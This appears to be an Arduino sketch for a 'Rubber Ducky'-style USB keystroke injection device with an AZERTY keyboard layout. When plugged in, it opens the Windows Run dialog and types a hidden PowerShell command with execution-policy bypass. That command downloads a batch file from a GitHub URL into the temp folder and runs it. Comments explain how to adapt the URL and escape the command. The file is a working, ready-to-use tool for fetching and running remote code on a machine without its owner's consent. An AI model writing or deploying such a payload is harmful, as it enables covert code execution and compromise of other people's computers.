#include <HIDKeyboardAzerty.h>

HIDKeyboardAz Keyboard; 


  void setup() {
    Keyboard.begin(); // Initializes keyboard
    delay(500);
  } 

  void loop() {
    Keyboard.pressKey(GUI, 'r'); // Open Windows execute
    Keyboard.releaseKey();
    delay(200);

    Keyboard.println("powershell -NoP -NonI -W Hidden -Exec Bypass \"IEX (New-Object System.Net.WebClient).DownloadFile(\'https://github.com/Luca-CRZ/Arduino/raw/main/RubberDucky/Script%20Example/script.txt\',\\\"$env:temp\\script.bat\\\"); Start-Process \\\"$env:temp\\script.bat\\\"\"");
    /*
    Download the file at this url and execute it
    https://github.com/Luca-CRZ/Arduino/raw/main/RubberDucky/Script%20Example/script.txt
    Dont forget to replace "blob" by "raw" in the url of the github file
    make sure you escape all the characters in this command (https://www.cescaper.com/)
    */
    delay(200);
    Keyboard.pressSpecialKey(ENTER);
    Keyboard.releaseKey();
    
    while(1); // the script is not looping
  }
